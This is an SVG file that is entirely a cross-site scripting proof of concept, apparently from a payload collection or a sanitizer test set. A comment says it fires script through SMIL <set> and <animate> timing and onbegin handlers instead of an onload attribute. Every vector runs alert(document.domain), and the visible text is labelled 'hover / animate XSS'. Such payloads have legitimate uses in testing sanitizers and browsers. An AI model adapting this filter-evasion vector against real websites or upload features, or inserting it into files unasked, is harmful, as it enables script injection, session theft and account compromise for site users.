<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <!-- SMIL-based execution: fires via <set>/<animate> event timing, no onload attr -->
  <a>
    <set attributeName="onmouseover" to="alert(document.domain)"/>
    <animate attributeName="href" values="javascript:alert(document.domain)" begin="0s" dur="1s"/>
    <text x="10" y="50">hover / animate XSS</text>
  </a>
  <rect width="100" height="100" fill="none" onbegin="alert(document.domain)">
    <animate attributeName="x" from="0" to="0" begin="0s" onbegin="alert(document.domain)"/>
  </rect>
</svg>
